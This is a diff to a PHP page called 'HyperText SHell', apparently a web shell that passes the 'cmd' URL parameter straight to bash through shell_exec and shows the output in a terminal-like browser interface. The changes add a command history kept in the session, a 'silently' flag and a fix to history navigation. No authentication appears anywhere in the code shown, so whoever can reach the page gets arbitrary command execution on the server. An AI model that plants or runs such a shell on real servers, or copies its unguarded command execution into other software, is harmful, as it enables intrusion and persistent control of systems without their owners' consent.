@@ -1,13 +1,20 @@
 <?php
     session_start();
 
-    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if(!isset($_SESSION['cwd']))
+        $_SESSION['cwd'] = getcwd();
+    if(!isset($_SESSION['history']))
+        $_SESSION['history'] = array();
 
-        if(!isset($_SESSION['cwd']))
-            $_SESSION['cwd'] = getcwd();
+    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+        
         chdir($_SESSION['cwd']);
         $output = htmlspecialchars(shell_exec('bash -c "'.addslashes($_GET["cmd"]).'; echo ""; pwd" 2>&1'));
         $_SESSION['cwd'] = end(explode("\n", trim($output)));
+        
+        if(!isset($_GET['silently']))
+            array_unshift($_SESSION['history'], $_GET['cmd']);
+
         die(nl2br(htmlspecialchars(shell_exec('bash -c "'.addslashes($_GET["cmd"]).'" 2>&1'))));
     }
 ?>
@@ -63,7 +70,7 @@ Welcome to HyperText SHell.
             var input;
             var cursor = '<span id="cursor">|</span>';
             var history_index = -1;
-            const history = [];
+            const history = <?php echo json_encode($_SESSION['history']); ?>;
             let buffer_temp = "";
             //const cd = [];
 
@@ -72,7 +79,7 @@ Welcome to HyperText SHell.
             }
 
             function show_prompt() {
-                fetch(url+"?cmd="+encodeURIComponent("pwd"),{method: 'POST', credentials: 'include'})
+                fetch(url+"?cmd=pwd&silently",{method: 'POST', credentials: 'include'})
                 .then((response) => response.text())
                 .then((result) => {
                     path = result.replaceAll("<br />","").trim();
@@ -138,6 +145,8 @@ Welcome to HyperText SHell.
                         case 38:
                             if (history_index < history.length -1)
                                 history_index++;
+                            if (history_index == -1)
+                                break;
                             if (history_index == 0)
                                 buffer_temp = buffer.value;
                             buffer.value = history[history_index];
